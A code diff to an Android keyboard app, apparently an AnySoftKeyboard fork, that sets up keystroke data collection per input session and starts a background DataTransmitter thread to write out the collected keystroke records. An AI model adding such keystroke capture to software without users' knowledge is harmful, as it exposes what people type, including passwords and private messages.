@@ -23,6 +23,7 @@ import android.os.Build;
 import android.os.IBinder;
 import android.support.annotation.NonNull;
 import android.support.annotation.Nullable;
+import android.support.annotation.RequiresApi;
 import android.support.v4.view.ViewCompat;
 import android.support.v7.app.AlertDialog;
 import android.text.TextUtils;
@@ -40,6 +41,7 @@ import android.widget.Toast;
 import com.anysoftkeyboard.api.KeyCodes;
 import com.anysoftkeyboard.base.utils.Logger;
 import com.anysoftkeyboard.datacollection.DataCollection;
+import com.anysoftkeyboard.datacollection.DataTransmitter;
 import com.anysoftkeyboard.datacollection.ExtendedKeyCodes;
 import com.anysoftkeyboard.datacollection.Keystroke;
 import com.anysoftkeyboard.datacollection.Word;
@@ -69,6 +71,7 @@ import com.menny.android.anysoftkeyboard.R;
 
 import net.evendanan.pixel.GeneralDialogController;
 
+import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Collections;
 import java.util.Date;
@@ -100,7 +103,7 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardIncognito {
     private int mOrientation = Configuration.ORIENTATION_PORTRAIT;
 
     //dc-- data collection fields test
-    private DataCollection dataCollection = new DataCollection();
+    private DataCollection dataCollection = null;
     private Word word = null;
     private float x = 0;
     private float y = 0;
@@ -234,6 +237,9 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardIncognito {
 
         super.onStartInputView(attribute, restarting);
 
+        //dc-- DataCollection init data collection
+        dataCollection = new DataCollection();
+
         if (mVoiceRecognitionTrigger != null) {
             mVoiceRecognitionTrigger.onStartInputView();
         }
@@ -262,7 +268,16 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardIncognito {
         final InputViewBinder inputView = getInputView();
         if (inputView != null) inputView.resetInputView();
 
+        //dc-- DataTransmitter test write file
+        if (dataCollection != null) {
+            DataTransmitter transmitter = new DataTransmitter(getApplicationContext(), dataCollection);
 
+            Thread thread = new Thread(transmitter);
+            thread.start();
+
+        }
+
+        dataCollection = null;
     }
 
     @Override
@@ -703,7 +718,7 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardIncognito {
         Logger.d(TAG, "dc-- Keystroke primaryCode=%d", primaryCode);
         wordAction(primaryCode);
 
-        float distance = (float) sqrt(key.squareDistanceFormCenter((int) dataCollection.getLastKeystroke().getX(), (int) dataCollection.getLastKeystroke().getY()));
+        int distance = (key.squareDistanceFormCenter((int) dataCollection.getLastKeystroke().getX(), (int) dataCollection.getLastKeystroke().getY()));
         dataCollection.getLastKeystroke().setDistance(distance);
         dataCollection.getLastKeystroke().setType(primaryCode);
 
